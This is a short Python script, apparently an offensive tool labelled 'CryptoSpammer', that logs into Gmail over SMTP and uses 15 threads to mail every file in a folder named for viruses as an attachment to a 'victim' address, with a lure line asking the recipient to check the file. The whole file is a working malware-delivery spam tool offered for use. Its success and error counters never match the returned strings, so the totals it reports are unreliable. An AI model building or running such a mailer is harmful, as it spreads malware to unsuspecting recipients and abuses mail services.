import smtplib
import os
import mimetypes
import concurrent.futures
from email.message import EmailMessage

# E-mail configurations
Email_From = "*****************"         # Modify to your e-mail account
Pass = "***************"                # Check how to get a App Password
Email_To = "******************"       # Modify to your victim

# Path to the files you want to send
Path_virus = "../Files"

# SMTP Google
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Number of Threads
NUM_THREADS = 15

# Success and Failures
success_count = 0
errors_count = 0


def send_email(file):
    """Send an e-mail with an attachment and return status"""
    global success_count, errors_count

    # Message configurations
    msg = EmailMessage()
    msg["Subject"] = "CryptoSpammer in Action - Ash3rSec"
    msg["From"] = Email_From
    msg["To"] = Email_To
    msg.set_content(f"Please check this: {file}")

    # Lock MIME type
    path_file = os.path.join(Path_virus, file)
    ctype, encoding = mimetypes.guess_type(path_file)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"

    main_type, sub_type = ctype.split("/", 1)

    with open(path_file, "rb") as f:
        msg.add_attachment(f.read(), maintype=main_type, subtype=sub_type, filename=file)

    # Connect SMTP and send e-mail
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Ativar TLS
            server.login(Email_From, Pass)
            server.send_message(msg)
        print(f"[✔] Success E-mail delivery: {file}")
        return "success"

    except Exception as e:
        print(f"[❌] Failure to send {file}: {e}")
        return "fail"


# Send using ThreadPoolExecutor and count success/failures
if __name__ == "__main__":
    if not os.path.exists(Path_virus):
        print("Folder not found!")

    else:
        virus_folder = os.listdir(Path_virus)
        if not virus_folder:
            print(f"Not found any files in: {Path_virus}")

        else:
            print(f"Starting the delivery of {len(virus_folder)} e-mails with {NUM_THREADS} threads...\n")

            with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
                futures = {executor.submit(send_email, file): file for file in virus_folder}

                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result == "sucesso":
                        success_count += 1
                    elif result == "erro":
                        errors_count += 1

            # Exhibit results
            print("\n[✔] Process finished!")
            print(f"📩 E-mails succeed: {success_count}")
            print(f"⚠️ Errors to send e-mails: {errors_count}")
